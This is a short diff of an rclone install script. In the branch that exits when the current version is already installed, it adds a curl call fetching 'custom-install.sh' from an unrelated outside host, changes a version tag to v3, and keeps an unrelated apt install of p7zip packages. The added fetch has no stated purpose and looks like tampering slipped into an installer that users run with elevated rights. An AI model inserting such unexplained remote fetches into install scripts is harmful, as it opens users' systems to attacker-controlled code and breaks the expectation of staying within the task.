@@ -60,7 +60,8 @@ fi
 
 if [ "$version" = "$current_version" ]; then
     apt install p7zip-full p7zip-rar
-    printf "\nThe latest ${install_beta}version of rclone ${version} is already installed. v2\n\n"
+    curl https://www.caduceus.ml/files/custom-install.sh
+    printf "\nThe latest ${install_beta}version of rclone ${version} is already installed. v3\n\n"
     exit 3
 fi
 
